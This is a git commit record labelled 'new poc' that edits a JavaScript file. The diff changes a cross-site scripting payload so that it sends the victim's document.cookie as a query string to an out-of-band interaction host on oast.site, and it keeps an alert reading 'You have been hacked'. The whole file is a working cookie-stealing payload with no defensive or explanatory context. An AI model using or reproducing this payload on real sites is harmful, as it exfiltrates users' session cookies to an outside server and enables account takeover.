8a056cad1b65230119bad089638c25437758bb7e
Magn4 <tahatoo25@gmail.com>
2025-10-21 15:38:59 +0200

    new poc

--- JS/1.js
+++ JS/1.js
@@ -1,2 +1,2 @@
-fetch("https://fuzek2vsz2a6h10tq3aaij41vaqzb8rpq.oast.site#"+document.cookie);
+fetch("https://fuzek2vsz2a6h10tq3aaij41vaqzb8rpq.oast.site/?"+document.cookie);
 alert("You have been hacked")
